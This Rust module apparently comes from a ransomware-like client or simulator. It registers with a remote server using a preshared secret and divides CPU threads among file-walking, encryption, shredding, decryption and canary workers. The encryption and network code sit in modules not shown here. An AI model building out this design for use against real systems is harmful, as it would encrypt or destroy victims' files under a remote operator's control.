use log::{debug, error, warn};
use std::{path::Path, thread::available_parallelism};

use crate::{
    comm::register,
    status::{create_status, export_status_csv, import_status_csv, Status},
};

pub fn initialize_client(
    exe_path_dir: &Path,
    server_fqdn: &str,
    server_port: u16,
    preshared_secret: &str,
    https: bool,
    verify_server: bool,
) -> Status {
    import_status_csv(exe_path_dir).map_or_else(
        || {
            warn!("Existing status not imported");
            let new_status = create_status();
            register(
                server_fqdn,
                server_port,
                &new_status,
                preshared_secret,
                https,
                verify_server,
            )
            .expect("Failed to register with server - cannot continue");
            export_status_csv(exe_path_dir, &new_status);
            debug!("Created new status: {new_status:?}");
            new_status
        },
        |csv| {
            debug!("Successully imported status: {csv:?}");
            csv
        },
    )
}

#[derive(Clone, Debug)]
pub struct ThreadNums {
    pub walk_threads: usize,
    pub shred_threads: usize,
    pub encrypt_threads: usize,
    pub decrypt_threads: usize,
    pub canary_threads: usize,
    pub encrypt_threads_canary: usize,
}

pub fn get_thread_nums() -> ThreadNums {
    let num_threads = match available_parallelism() {
        Ok(suggested) => {
            debug!("Successfully got suggested number of threads: {suggested}");
            suggested.get()
        }
        Err(error) => {
            error!("Failed to get suggested number of threads: {error}");
            1
        }
    };

    let num_walk_threads = if num_threads >= 4 {
        (num_threads / 4).max(2)
    } else {
        1
    };
    let num_canary_threads = (num_threads / 6).max(1);
    let num_shred_threads = (num_threads / 6).max(1);
    let remaining = num_threads
        .saturating_sub(num_walk_threads + num_canary_threads + num_shred_threads)
        .max(1);
    let num_encrypt_threads = remaining;
    let num_encrypt_threads_canary = num_encrypt_threads
        .saturating_sub(num_canary_threads)
        .max(1);
    let num_decrypt_threads = (num_threads - num_walk_threads).max(1);

    debug!(
        "Using {num_walk_threads} walk, {num_canary_threads} canary, {num_encrypt_threads} encrypt, {num_shred_threads} shred"
    );

    ThreadNums {
        walk_threads: num_walk_threads,
        shred_threads: num_shred_threads,
        encrypt_threads: num_encrypt_threads,
        decrypt_threads: num_decrypt_threads,
        canary_threads: num_canary_threads,
        encrypt_threads_canary: num_encrypt_threads_canary,
    }
}
